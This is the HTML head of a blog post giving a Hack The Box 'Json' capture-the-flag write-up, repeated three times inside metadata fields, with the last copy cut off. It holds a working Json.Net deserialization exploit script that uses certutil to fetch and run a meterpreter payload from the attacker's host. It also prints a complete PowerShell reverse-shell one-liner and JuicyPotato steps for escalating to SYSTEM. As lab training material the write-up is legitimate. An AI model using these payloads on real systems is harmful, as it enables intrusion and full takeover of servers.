<!DOCTYPE html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="theme" content="Chirpy v2.7.2"><meta name="generator" content="Jekyll v4.2.0" /><meta property="og:title" content="Hack The Box - Json" /><meta name="author" content="rizemon" /><meta property="og:locale" content="en_US" /><meta name="description" content="Configuration The operating systems that I will be using to tackle this machine is a Kali Linux VM. What I learnt from other writeups is that it was a good habit to map a domain name to the machine’s IP address so as that it will be easier to remember. This can done by appending a line to /etc/hosts. 1 $ echo &quot;10.10.10.158 json.htb&quot; &gt;&gt; /etc/hosts Reconnaissance Using nmap, we are able to determine the open ports and running services on the machine. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 $ nmap -sV -sT -sC json.htb Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-17 23:17 EST Nmap scan report for json.htb (10.10.10.158) Host is up (0.26s latency). Not shown: 988 closed ports PORT STATE SERVICE VERSION 21/tcp open ftp FileZilla ftpd | ftp-syst: |_ SYST: UNIX emulated by FileZilla 80/tcp open http Microsoft IIS httpd 8.5 | http-methods: |_ Potentially risky methods: TRACE |_http-server-header: Microsoft-IIS/8.5 |_http-title: Json HTB 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds 49152/tcp open msrpc Microsoft Windows RPC 49153/tcp open msrpc Microsoft Windows RPC 49154/tcp open msrpc Microsoft Windows RPC 49155/tcp open msrpc Microsoft Windows RPC 49156/tcp open msrpc Microsoft Windows RPC 49157/tcp open msrpc Microsoft Windows RPC 49158/tcp open msrpc Microsoft Windows RPC Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: mean: 4h01m13s, deviation: 0s, median: 4h01m13s |_nbstat: NetBIOS name: JSON, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 00:50:56:bd:00:23 (VMware) | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) | smb2-security-mode: | 2.02: |_ Message signing enabled but not required | smb2-time: | date: 2020-01-18T08:19:44 |_ start_date: 2020-01-18T07:11:14 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 82.99 seconds Enumeration (1) When trying the access the ftp service, I wasn’t able to login anonymously, hence I went straight for the http service. Something weird actually happens because it went from what seems to be a dashboard: to a login page at /login.html: Tried some default usernames and passwords and admin:admin worked! I guess the usage of the StartBootStrap Admin theme was a hint. After logging in, we were directed back to the dashboard. Someone probably didn’t implement things correctly haha Among the requests sent during the login, there was a suspicous GET request being sent to /api/account. The response was: 1 2 3 4 5 6 7 { &quot;Id&quot;:1, &quot;UserName&quot;:&quot;admin&quot;, &quot;Password&quot;:&quot;21232f297a57a5a743894a0e4a801fc3&quot;, &quot;Name&quot;:&quot;User Admin HTB&quot;, &quot;Rol&quot;:&quot;Administrator&quot; } No requests parameters were sent so maybe the OAuth2 token in the Bearer header has something to do with it? The session value also had the same value for some reason. When to base64-decoding it, we got the same exact content as the response. Lets try to cause some base64-decoding issues and hopefully see some errors :) 1 2 3 4 5 6 7 8 9 import base64 import requests headers = { &quot;Bearer&quot;: base64.b64encode(b&quot;something&quot;) } resp = requests.get(&quot;http://json.htb/api/Account/&quot;, headers=headers) print(resp.content) Running the above script got: 1 b&#39;{&quot;Message&quot;:&quot;An error has occurred.&quot;,&quot;ExceptionMessage&quot;:&quot;Cannot deserialize Json.Net Object&quot;,&quot;ExceptionType&quot;:&quot;System.Exception&quot;,&quot;StackTrace&quot;:null}&#39; Json.Net? Didn’t know how to exploit but I came across this tool that is able to generate some sort of payload to execute commands ? What was neat was that the first example actually suited our needs and all we have to do is change the command executed. Exploitation (1) First, we need to generate our meterpreter payload and serve it using SimpleHTTPServer on port 80. 1 2 3 4 5 6 7 8 $ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.XX.XX LPORT=XXXX -f exe &gt; shell.exe [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload [-] No arch selected, selecting arch: x86 from the payload No encoder or badchars specified, outputting raw payload Payload size: 341 bytes Final size of exe file: 73802 bytes $ python -m SimpleHTTPServer 80 Serving HTTP on 0.0.0.0 port 80 ... Next, we set up our reverse shell handler using msfconsole: 1 2 3 4 5 6 7 8 9 10 $ msfconsole msf5 &gt; use exploit/multi/handler msf5 exploit(multi/handler) &gt; set LHOST 10.10.XX.XX LHOST =&gt; 10.10.XX.XX msf5 exploit(multi/handler) &gt; set LPORT 4444 LPORT =&gt; XXXX msf5 exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_tcp payload =&gt; windows/meterpreter/reverse_tcp msf5 exploit(multi/handler) &gt; run [*] Started reverse TCP handler on 10.10.XX.XX:XXXX And now our exploit script to pull everything together: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 import base64 import requests import json IP = &quot;10.10.XX.XX&quot; PORT = &quot;XXXX&quot; template = r&quot;&quot;&quot; { &quot;$type&quot;:&quot;System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35&quot;, &quot;MethodName&quot;:&quot;Start&quot;, &quot;MethodParameters&quot;:{ &quot;$type&quot;:&quot;System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089&quot;, &quot;$values&quot;:[&quot;cmd&quot;,&quot;/c %s&quot;] }, &quot;ObjectInstance&quot;:{&quot;$type&quot;:&quot;System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089&quot;} } &quot;&quot;&quot; commands = [ r&quot;mkdir c:\\tmp&quot;, r&quot;certutil -f -split -urlcache http://%s:%s/shell.exe c:\\tmp\\shell.exe&quot; % (IP, PORT), r&quot;c:\\tmp\\shell.exe&quot; ] for command in commands: payload = template % (command,) minified = json.dumps(json.loads(payload)).encode() headers = { &quot;Bearer&quot;: base64.b64encode(minified) } resp = requests.get(&quot;http://json.htb/api/Account/&quot;, headers=headers) Running the script got us our session ! :) 1 2 3 4 [*] Sending stage (180291 bytes) to 10.10.10.158 [*] Meterpreter session 1 opened (10.10.XX.XX:XXXX -&gt; 10.10.10.158:52355) at 2020-02-15 09:29:17 -0500 meterpreter &gt; getuid Server username: JSON\userpool user.txt 1 2 3 4 5 6 7 8 meterpreter &gt; shell Process 676 created. Channel 1 created. Microsoft Windows [Version 6.3.9600] (c) 2013 Microsoft Corporation. All rights reserved. c:\windows\system32\inetsrv&gt;more C:\Users\userpool\Destkop\user.txt 3445XXXXXXXXXXXXXXXXXXXXXXXXXXXX Enumeration (2) If we look at what privileges we have as userpool, 1 2 3 4 5 6 7 8 9 10 11 12 c:\windows\system32\inetsrv&gt;whoami /priv PRIVILEGES INFORMATION ---------------------- Privilege Name Description State ============================= ========================================= ======== SeAssignPrimaryTokenPrivilege Replace a process level token Disabled SeIncreaseQuotaPrivilege Adjust memory quotas for a process Disabled SeAuditPrivilege Generate security audits Disabled SeChangeNotifyPrivilege Bypass traverse checking Enabled SeImpersonatePrivilege Impersonate a client after authentication Enabled SeIncreaseWorkingSetPrivilege Increase a process working set Disabled According to PayloadAllTheThings, if we got SeImpersonate or SeAssignPrimaryToken privileges (which is this case we have both), we can use Juicy Potato. First we create a .bat script to run a Powershell command that connects back to us. 1 powershell -nop -c &quot;$client = New-Object System.Net.Sockets.TCPClient(&#39;10.10.XX.XX&#39;,XXXX); $stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{0}; while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){ ;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i); $sendback = (IEX $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + &#39;PS &#39; + (pwd).Path + &#39;&gt; &#39;; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}; $client.Close()&quot; Then we use meterpreter to upload the files to the box: 1 2 3 4 5 6 meterpreter &gt; upload /root/Desktop/web/x.bat C:\\tmp [*] uploading : /root/Desktop/web/x.bat -&gt; C:\tmp [*] uploaded : /root/Desktop/web/x.bat -&gt; C:\tmp\x.bat meterpreter &gt; upload /root/Desktop/web/JuicyPotato.exe C:\\tmp [*] uploading : /root/Desktop/web/JuicyPotato.exe -&gt; C:\tmp [*] uploaded : /root/Desktop/web/JuicyPotato.exe -&gt; C:\tmp\JuicyPotato.exe Next we start a listener on our machine: 1 2 $ nc -lvnp XXXX listening on [any] XXXX ... To use JuicyPotato.exe, we need to know the CLSID based on the box’s Windows version Microsoft Windows Server 2012 R2 Datacenter (The version can be retrieved by running systeminfo on the box.). The CLSID can be gotten from here. Make sure the User belonging to the CLSID you have chosen is NT AUTHORITY/SYSTEM. The last step would be to run JuicyPotato.exe on the box. 1 2 3 4 5 6 7 c:\tmp&gt; JuicyPotato.exe -l XXXX -p c:\tmp\x.bat -t * -c {e60687f7-01a1-40aa-86ac-db1cbf673334} Testing {e60687f7-01a1-40aa-86ac-db1cbf673334} XXXX .... [+] authresult 0 {e60687f7-01a1-40aa-86ac-db1cbf673334};NT AUTHORITY\SYSTEM [+] CreateProcessWithTokenW OK On our listener, we caught the connection: 1 2 3 connect to [10.10.XX.XX] from (UNKNOWN) [10.10.10.158] 52604 PS C:\Windows\system32&gt; whoami nt authority\system root.txt 1 2 PS C:\Windows\system32&gt; more C:\Users\superadmin\Desktop\root.txt 3cc8XXXXXXXXXXXXXXXXXXXXXXXXXXXX Rooted ! Thank you for reading and look forward for more writeups and articles !" /><meta property="og:description" content="Configuration The operating systems that I will be using to tackle this machine is a Kali Linux VM. What I learnt from other writeups is that it was a good habit to map a domain name to the machine’s IP address so as that it will be easier to remember. This can done by appending a line to /etc/hosts. 1 $ echo &quot;10.10.10.158 json.htb&quot; &gt;&gt; /etc/hosts Reconnaissance Using nmap, we are able to determine the open ports and running services on the machine. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 $ nmap -sV -sT -sC json.htb Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-17 23:17 EST Nmap scan report for json.htb (10.10.10.158) Host is up (0.26s latency). Not shown: 988 closed ports PORT STATE SERVICE VERSION 21/tcp open ftp FileZilla ftpd | ftp-syst: |_ SYST: UNIX emulated by FileZilla 80/tcp open http Microsoft IIS httpd 8.5 | http-methods: |_ Potentially risky methods: TRACE |_http-server-header: Microsoft-IIS/8.5 |_http-title: Json HTB 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds 49152/tcp open msrpc Microsoft Windows RPC 49153/tcp open msrpc Microsoft Windows RPC 49154/tcp open msrpc Microsoft Windows RPC 49155/tcp open msrpc Microsoft Windows RPC 49156/tcp open msrpc Microsoft Windows RPC 49157/tcp open msrpc Microsoft Windows RPC 49158/tcp open msrpc Microsoft Windows RPC Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: mean: 4h01m13s, deviation: 0s, median: 4h01m13s |_nbstat: NetBIOS name: JSON, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 00:50:56:bd:00:23 (VMware) | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) | smb2-security-mode: | 2.02: |_ Message signing enabled but not required | smb2-time: | date: 2020-01-18T08:19:44 |_ start_date: 2020-01-18T07:11:14 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 82.99 seconds Enumeration (1) When trying the access the ftp service, I wasn’t able to login anonymously, hence I went straight for the http service. Something weird actually happens because it went from what seems to be a dashboard: to a login page at /login.html: Tried some default usernames and passwords and admin:admin worked! I guess the usage of the StartBootStrap Admin theme was a hint. After logging in, we were directed back to the dashboard. Someone probably didn’t implement things correctly haha Among the requests sent during the login, there was a suspicous GET request being sent to /api/account. The response was: 1 2 3 4 5 6 7 { &quot;Id&quot;:1, &quot;UserName&quot;:&quot;admin&quot;, &quot;Password&quot;:&quot;21232f297a57a5a743894a0e4a801fc3&quot;, &quot;Name&quot;:&quot;User Admin HTB&quot;, &quot;Rol&quot;:&quot;Administrator&quot; } No requests parameters were sent so maybe the OAuth2 token in the Bearer header has something to do with it? The session value also had the same value for some reason. When to base64-decoding it, we got the same exact content as the response. Lets try to cause some base64-decoding issues and hopefully see some errors :) 1 2 3 4 5 6 7 8 9 import base64 import requests headers = { &quot;Bearer&quot;: base64.b64encode(b&quot;something&quot;) } resp = requests.get(&quot;http://json.htb/api/Account/&quot;, headers=headers) print(resp.content) Running the above script got: 1 b&#39;{&quot;Message&quot;:&quot;An error has occurred.&quot;,&quot;ExceptionMessage&quot;:&quot;Cannot deserialize Json.Net Object&quot;,&quot;ExceptionType&quot;:&quot;System.Exception&quot;,&quot;StackTrace&quot;:null}&#39; Json.Net? Didn’t know how to exploit but I came across this tool that is able to generate some sort of payload to execute commands ? What was neat was that the first example actually suited our needs and all we have to do is change the command executed. Exploitation (1) First, we need to generate our meterpreter payload and serve it using SimpleHTTPServer on port 80. 1 2 3 4 5 6 7 8 $ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.XX.XX LPORT=XXXX -f exe &gt; shell.exe [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload [-] No arch selected, selecting arch: x86 from the payload No encoder or badchars specified, outputting raw payload Payload size: 341 bytes Final size of exe file: 73802 bytes $ python -m SimpleHTTPServer 80 Serving HTTP on 0.0.0.0 port 80 ... Next, we set up our reverse shell handler using msfconsole: 1 2 3 4 5 6 7 8 9 10 $ msfconsole msf5 &gt; use exploit/multi/handler msf5 exploit(multi/handler) &gt; set LHOST 10.10.XX.XX LHOST =&gt; 10.10.XX.XX msf5 exploit(multi/handler) &gt; set LPORT 4444 LPORT =&gt; XXXX msf5 exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_tcp payload =&gt; windows/meterpreter/reverse_tcp msf5 exploit(multi/handler) &gt; run [*] Started reverse TCP handler on 10.10.XX.XX:XXXX And now our exploit script to pull everything together: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 import base64 import requests import json IP = &quot;10.10.XX.XX&quot; PORT = &quot;XXXX&quot; template = r&quot;&quot;&quot; { &quot;$type&quot;:&quot;System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35&quot;, &quot;MethodName&quot;:&quot;Start&quot;, &quot;MethodParameters&quot;:{ &quot;$type&quot;:&quot;System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089&quot;, &quot;$values&quot;:[&quot;cmd&quot;,&quot;/c %s&quot;] }, &quot;ObjectInstance&quot;:{&quot;$type&quot;:&quot;System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089&quot;} } &quot;&quot;&quot; commands = [ r&quot;mkdir c:\\tmp&quot;, r&quot;certutil -f -split -urlcache http://%s:%s/shell.exe c:\\tmp\\shell.exe&quot; % (IP, PORT), r&quot;c:\\tmp\\shell.exe&quot; ] for command in commands: payload = template % (command,) minified = json.dumps(json.loads(payload)).encode() headers = { &quot;Bearer&quot;: base64.b64encode(minified) } resp = requests.get(&quot;http://json.htb/api/Account/&quot;, headers=headers) Running the script got us our session ! :) 1 2 3 4 [*] Sending stage (180291 bytes) to 10.10.10.158 [*] Meterpreter session 1 opened (10.10.XX.XX:XXXX -&gt; 10.10.10.158:52355) at 2020-02-15 09:29:17 -0500 meterpreter &gt; getuid Server username: JSON\userpool user.txt 1 2 3 4 5 6 7 8 meterpreter &gt; shell Process 676 created. Channel 1 created. Microsoft Windows [Version 6.3.9600] (c) 2013 Microsoft Corporation. All rights reserved. c:\windows\system32\inetsrv&gt;more C:\Users\userpool\Destkop\user.txt 3445XXXXXXXXXXXXXXXXXXXXXXXXXXXX Enumeration (2) If we look at what privileges we have as userpool, 1 2 3 4 5 6 7 8 9 10 11 12 c:\windows\system32\inetsrv&gt;whoami /priv PRIVILEGES INFORMATION ---------------------- Privilege Name Description State ============================= ========================================= ======== SeAssignPrimaryTokenPrivilege Replace a process level token Disabled SeIncreaseQuotaPrivilege Adjust memory quotas for a process Disabled SeAuditPrivilege Generate security audits Disabled SeChangeNotifyPrivilege Bypass traverse checking Enabled SeImpersonatePrivilege Impersonate a client after authentication Enabled SeIncreaseWorkingSetPrivilege Increase a process working set Disabled According to PayloadAllTheThings, if we got SeImpersonate or SeAssignPrimaryToken privileges (which is this case we have both), we can use Juicy Potato. First we create a .bat script to run a Powershell command that connects back to us. 1 powershell -nop -c &quot;$client = New-Object System.Net.Sockets.TCPClient(&#39;10.10.XX.XX&#39;,XXXX); $stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{0}; while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){ ;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i); $sendback = (IEX $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + &#39;PS &#39; + (pwd).Path + &#39;&gt; &#39;; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}; $client.Close()&quot; Then we use meterpreter to upload the files to the box: 1 2 3 4 5 6 meterpreter &gt; upload /root/Desktop/web/x.bat C:\\tmp [*] uploading : /root/Desktop/web/x.bat -&gt; C:\tmp [*] uploaded : /root/Desktop/web/x.bat -&gt; C:\tmp\x.bat meterpreter &gt; upload /root/Desktop/web/JuicyPotato.exe C:\\tmp [*] uploading : /root/Desktop/web/JuicyPotato.exe -&gt; C:\tmp [*] uploaded : /root/Desktop/web/JuicyPotato.exe -&gt; C:\tmp\JuicyPotato.exe Next we start a listener on our machine: 1 2 $ nc -lvnp XXXX listening on [any] XXXX ... To use JuicyPotato.exe, we need to know the CLSID based on the box’s Windows version Microsoft Windows Server 2012 R2 Datacenter (The version can be retrieved by running systeminfo on the box.). The CLSID can be gotten from here. Make sure the User belonging to the CLSID you have chosen is NT AUTHORITY/SYSTEM. The last step would be to run JuicyPotato.exe on the box. 1 2 3 4 5 6 7 c:\tmp&gt; JuicyPotato.exe -l XXXX -p c:\tmp\x.bat -t * -c {e60687f7-01a1-40aa-86ac-db1cbf673334} Testing {e60687f7-01a1-40aa-86ac-db1cbf673334} XXXX .... [+] authresult 0 {e60687f7-01a1-40aa-86ac-db1cbf673334};NT AUTHORITY\SYSTEM [+] CreateProcessWithTokenW OK On our listener, we caught the connection: 1 2 3 connect to [10.10.XX.XX] from (UNKNOWN) [10.10.10.158] 52604 PS C:\Windows\system32&gt; whoami nt authority\system root.txt 1 2 PS C:\Windows\system32&gt; more C:\Users\superadmin\Desktop\root.txt 3cc8XXXXXXXXXXXXXXXXXXXXXXXXXXXX Rooted ! Thank you for reading and look forward for more writeups and articles !" /><link rel="canonical" href="https://rizemon.github.io/posts/json-htb/" /><meta property="og:url" content="https://rizemon.github.io/posts/json-htb/" /><meta property="og:site_name" content="rizemon’s blog" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2020-02-16T01:41:00+08:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Hack The Box - Json" /><meta name="twitter:site" content="@rizemon" /><meta name="twitter:creator" content="@rizemon" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"author":{"@type":"Person","name":"rizemon"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://rizemon.github.io/posts/json-htb/"},"description":"Configuration The operating systems that I will be using to tackle this machine is a Kali Linux VM. What I learnt from other writeups is that it was a good habit to map a domain name to the machine’s IP address so as that it will be easier to remember. This can done by appending a line to /etc/hosts. 1 $ echo &quot;10.10.10.158 json.htb&quot; &gt;&gt; /etc/hosts Reconnaissance Using nmap, we are able to determine the open ports and running services on the machine. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 $ nmap -sV -sT -sC json.htb Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-17 23:17 EST Nmap scan report for json.htb (10.10.10.158) Host is up (0.26s latency). Not shown: 988 closed ports PORT STATE SERVICE VERSION 21/tcp open ftp FileZilla ftpd | ftp-syst: |_ SYST: UNIX emulated by FileZilla 80/tcp open http Microsoft IIS httpd 8.5 | http-methods: |_ Potentially risky methods: TRACE |_http-server-header: Microsoft-IIS/8.5 |_http-title: Json HTB 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds 49152/tcp open msrpc Microsoft Windows RPC 49153/tcp open msrpc Microsoft Windows RPC 49154/tcp open msrpc Microsoft Windows RPC 49155/tcp open msrpc Microsoft Windows RPC 49156/tcp open msrpc Microsoft Windows RPC 49157/tcp open msrpc Microsoft Windows RPC 49158/tcp open msrpc Microsoft Windows RPC Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: mean: 4h01m13s, deviation: 0s, median: 4h01m13s |_nbstat: NetBIOS name: JSON, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 00:50:56:bd:00:23 (VMware) | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) | smb2-security-mode: | 2.02: |_ Message signing enabled but not required | smb2-time: | date: 2020-01-18T08:19:44 |_ start_date: 2020-01-18T07:11:14 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 82.99 seconds Enumeration (1) When trying the access the ftp service, I wasn’t able to login anonymously, hence I went straight for the http service. Something weird actually happens because it went from what seems to be a dashboard: to a login page at /login.html: Tried some default usernames and passwords and admin:admin worked! I guess the usage of the StartBootStrap Admin theme was a hint. After logging in, we were directed back to the dashboard. Someone probably didn’t implement things correctly haha Among the requests sent during the login, there was a suspicous GET request being sent to /api/account. The response was: 1 2 3 4 5 6 7 { &quot;Id&quot;:1, &quot;UserName&quot;:&quot;admin&quot;, &quot;Password&quot;:&quot;21232f297a57a5a743894a0e4a801fc3&quot;, &quot;Name&quot;:&quot;User Admin HTB&quot;, &quot;Rol&quot;:&quot;Administrator&quot; } No requests parameters were sent so maybe the OAuth2 token in the Bearer header has something to do with it? The session value also had the same value for some reason. When to base64-decoding it, we got the same exact content as the response. Lets try to cause some base64-decoding issues and hopefully see some errors :) 1 2 3 4 5 6 7 8 9 import base64 import requests headers = { &quot;Bearer&quot;: base64.b64encode(b&quot;something&quot;) } resp = requests.get(&quot;http://json.htb/api/Account/&quot;, headers=headers) print(resp.content) Running the above script got: 1 b&#39;{&quot;Message&quot;:&quot;An error has occurred.&quot;,&quot;ExceptionMessage&quot;:&quot;Cannot deserialize Json.Net Object&quot;,&quot;ExceptionType&quot;:&quot;System.Exception&quot;,&quot;StackTrace&quot;:null}&#39; Json.Net? Didn’t know how to exploit but I came across this tool that is able to generate some sort of payload to execute commands ? What was neat was that the first example actually suited our needs and all we have to do is change the command executed. Exploitation (1) First, we need to generate our meterpreter payload and serve it using SimpleHTTPServer on port 80. 1 2 3 4 5 6 7 8 $ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.XX.XX LPORT=XXXX -f exe &gt; shell.exe [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload [-] No arch selected, selecting arch: x86 from the payload No encoder or badchars specified, outputting raw payload Payload size: 341 bytes Final size of exe file: 73802 bytes $ python -m SimpleHTTPServer 80 Serving HTTP on 0.0.0.0 port 80 ... Next, we set up our reverse shell handler using msfconsole: 1 2 3 4 5 6 7 8 9 10 $ msfconsole msf5 &gt; use exploit/multi/handler msf5 exploit(multi/handler) &gt; set LHOST 10.10.XX.XX LHOST =&gt; 10.10.XX.XX msf5 exploit(multi/handler) &gt; set LPORT 4444 LPORT =&gt; XXXX msf5 exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_tcp payload =&gt; windows/meterpreter/reverse_tcp msf5 exploit(multi/handler) &gt; run [*] Started reverse TCP handler on 10.10.XX.XX:XXXX And now our exploit script to pull everything together: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 import base64 import requests import json IP = &quot;10.10.XX.XX&quot; PORT = &quot;XXXX&quot; template = r&quot;&quot;&quot; { &quot;$type&quot;:&quot;System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35&quot;, &quot;MethodName&quot;:&quot;Start&quot;, &quot;MethodParameters&quot;:{ &quot;$type&quot;:&quot;System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089&quot;, &quot;$values&quot;:[&quot;cmd&quot;,&quot;/c %s&quot;] }, &quot;ObjectInstance&quot;:{&quot;$type&quot;:&quot;System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089&quot;} } &quot;&quot;&quot; commands = [ r&quot;mkdir c:\\\\tmp&quot;, r&quot;certutil -f -split -urlcache http://%s:%s/shell.exe c:\\\\tmp\\\\shell.exe&quot; % (IP, PORT), r&quot;c:\\\\tmp\\\\shell.exe&quot; ] for command in commands: payload = template % (command,) minified = json.dumps(json.loads(payload)).encode() headers = { &quot;Bearer&quot;: base64.b64encode(minified) } resp = requests.get(&quot;http://json.htb/api/Account/&quot;, headers=headers) Running the script got us our session ! :) 1 2 3 4 [*] Sending stage (180291 bytes) to 10.10.10.158 [*] Meterpreter session 1 opened (10.10.XX.XX:XXXX -&gt; 10.10.10.158:52355) at 2020-02-15 09:29:17 -0500 meterpreter &gt; getuid Server username: JSON\\userpool user.txt 1 2 3 4 5 6 7 8 meterpreter &gt; shell Process 676 created. Channel 1 created. Microsoft Windows [Version 6.3.9600] (c) 2013 Microsoft Corporation. All rights reserved. c:\\windows\\system32\\inetsrv&gt;more C:\\Users\\userpool\\Destkop\\user.txt 3445XXXXXXXXXXXXXXXXXXXXXXXXXXXX Enumeration (2) If we look at what privileges we have as userpool, 1 2 3 4 5 6 7 8 9 10 11 12 c:\\windows\\system32\\inetsrv&gt;whoami /priv PRIVILEGES INFORMATION ---------------------- Privilege Name Description State ============================= ========================================= ======== SeAssignPrimaryTokenPrivilege Replace a process level token Disabled SeIncreaseQuotaPrivilege Adjust memory quotas for a process Disabled SeAuditPrivilege Generate security audits Disabled SeChangeNotifyPrivilege Bypass traverse checking Enabled SeImpersonatePrivilege Impersonate a client after authentication Enabled SeIncreaseWorkingSetPrivilege Increase a process working set Disabled According to PayloadAllTheThings, if we got SeImpersonate or SeAssignPrimaryToken privileges (which is this case we have both), we can use Juicy Potato. First we create a .bat script to run a Powershell command that connects back to us. 1 powershell -nop -c &quot;$client = New-Object System.Net.Sockets.TCPClient(&#39;10.10.XX.XX&#39;,XXXX); $stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{0}; while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){ ;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i); $sendback = (IEX $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + &#39;PS &#39; + (pwd).Path + &#39;&gt; &#39;; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}; $client.Close()&quot; Then we use meterpreter to upload the files to the box: 1 2 3 4 5 6 meterpreter &gt; upload /root/Desktop/web/x.bat C:\\\\tmp [*] uploading : /root/Desktop/web/x.bat -&gt; C:\\tmp [*] uploaded : /root/Desktop/web/x.bat -&gt; C:\\tmp\\x.bat meterpreter &gt; upload /root/Desktop/web/JuicyPotato.exe C:\\\\tmp [*] uploading : /root/Desktop/web/JuicyPotato.exe -&gt; C:\\tmp [*] uploaded : /root/Desktop/web/JuicyPotato.exe -&gt; C:\\tmp\\JuicyPotato.exe Next we start a listener on our machine: 1 2 $ nc -lvnp XXXX listening on [any] XXXX ... To use JuicyPotato.exe, we need to know the CLSID based on the box’s Windows version Microsoft Windows Server 2012 R2 Datacenter (The version can be retrieved by running systeminfo on the box.). The CLSID can be gotten from here. Make sure the User belonging to the CLSID you have chosen is NT AUTHORITY/SYSTEM. The last step would be to run JuicyPotato.exe on the box. 1 2 3 4 5 6 7 c:\\tmp&gt; JuicyPotato.exe -l XXXX -p c:\\tmp\\x.bat -t * -c {e60687f7-01a1-40aa-86ac-db1cbf673334} Testing {e60687f7-01a1-40aa-86ac-db1cbf673334} XXXX .... [+] authresult 0 {e60687f7-01a1-40aa-86ac-db1cbf673334};NT AUTHORITY\\SYSTEM [+] CreateProcessWithTokenW OK On our listener, we caught the connection: 1 2 3 connect to [10.10.XX.XX] from (UNKNOWN) 